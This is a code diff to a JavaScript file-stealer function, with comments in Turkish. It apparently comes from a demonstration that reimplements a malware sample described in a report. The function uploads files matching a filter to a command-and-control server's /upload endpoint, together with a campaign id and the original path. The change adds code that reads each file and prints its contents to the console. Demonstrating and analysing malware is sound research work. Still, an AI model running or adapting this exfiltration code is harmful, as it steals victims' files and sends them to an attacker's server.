@@ -52,15 +52,27 @@ function isFileMatching(filename) {
 
 /** Eşleşen bir dosyayı, rapordaki gibi multipart/form-data ile C2'ye yükler. */
 async function uploadFile(filePath) {
+  // 📄 Dosya içeriğini oku (sadece metin dosyaları için güvenli)
+  let content = '';
+  try {
+    content = fs.readFileSync(filePath, 'utf8');
+    console.log(`[demo] 📄 Dosya içeriği (${path.basename(filePath)}):`);
+    console.log(content);
+    console.log('---');
+  } catch (readErr) {
+    // Binary dosyalar için okuma hatası olabilir, sessiz geç
+  }
+
+  // Mevcut yükleme işlemi (değişmedi)
   const form = new FormData();
   form.append("file", fs.createReadStream(filePath));
   form.append("uid", config.demoCampaignId);
   form.append("originalPath", filePath);
   try {
     await axios.post(`${config.c2HttpBase}/upload`, form, { headers: form.getHeaders() });
-    console.log(`[demo] Eşleşen dosya C2'ye yüklendi: ${path.basename(filePath)}`);
+    console.log(`[demo] ✅ Eşleşen dosya C2'ye yüklendi: ${path.basename(filePath)}`);
   } catch (err) {
-    console.log(`[demo] Yükleme başarısız (C2 kapalı olabilir): ${path.basename(filePath)}`);
+    console.log(`[demo] ❌ Yükleme başarısız (C2 kapalı olabilir): ${path.basename(filePath)}`);
   }
 }
 
